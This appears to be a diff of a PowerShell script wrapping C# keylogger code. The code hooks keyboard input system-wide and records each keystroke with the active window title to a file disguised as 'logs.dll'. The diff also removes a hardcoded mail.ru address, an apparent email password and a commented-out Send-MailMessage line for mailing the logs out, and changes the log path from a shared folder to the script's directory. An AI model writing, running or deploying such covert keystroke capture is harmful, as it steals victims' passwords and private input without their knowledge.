@@ -1,15 +1,4 @@
 
-# Custom
-$global:key_email = "blabla.97@internet.ru"
-$global:key_emailp = "zc4qT8QwbaKsxrJUjxym"
-$global:temp_dir = ($env:Temp + "\lehR")
-
-#Add-Content -Path C:\Users\me\AppData\Local\Temp\lehRP\lel.txt "kek"
-
-# Uhuh
-# Send-MailMessage -From $email -To $email -Subject "test3" -Attachment .\$mail_attach -SmtpServer smtp.mail.ru -Port 587 -UseSsl -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $email, $emailp)
-
-
 $csharp  = @"
   using System;
   using System.Runtime.InteropServices;
@@ -51,6 +40,8 @@ $csharp  = @"
     // Pressed key
     public const int WM_KEYDOWN = 0x0100;
 
+    // Duh
+    public static string currDir { get; set; }
 
     // Yeah
     //static IntPtr key_layout;
@@ -78,11 +69,11 @@ $csharp  = @"
         //if (!GetKeyboardState(keyState))
           //return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
 
-        //Console.WriteLine("[{0}]", (Keys)virtual_code);
+        // Console.WriteLine("[{0}]", currDir);
         string keyText = string.Format("[{0}]", (Keys)virtual_code);
-        string logFilePath = @"\\VBOXSVR\share\tools\keylog\logs.dll";
+        // string logFilePath = @"\\VBOXSVR\share\tools\keylog\logs.dll";
 
-        System.IO.File.AppendAllText(logFilePath, keyText);
+        System.IO.File.AppendAllText(currDir, keyText);
       }
 
       // Next hook procedures...
@@ -112,6 +103,10 @@ $csharp  = @"
 Add-Type -ReferencedAssemblies System.Windows.Forms -TypeDefinition $csharp -Language CSharp
 
 #$global:keyboard_hook = [WinAPI]::initHookProc();
+
+# Pass to c#
+$global:k_cur_dir = $PSScriptRoot
+[WinAPI]::currDir = ($global:k_cur_dir + "\logs.dll")
 
 # For saving prev fg
 $global:fg_prev_title = ""
@@ -165,7 +160,7 @@ while ($true) {
       [WinAPI]::endHookProc($global:keyboard_hook);
 
       $global:date = Get-Date
-      Add-Content -Path ./logs.dll -Value "[ $global:fg_curr_title at $global:date ]"
+      Add-Content -Path "$global:k_cur_dir\logs.dll" -Value "[ $global:fg_curr_title at $global:date ]"
       $global:keyboard_hook = [WinAPI]::initHookProc();
     }
 
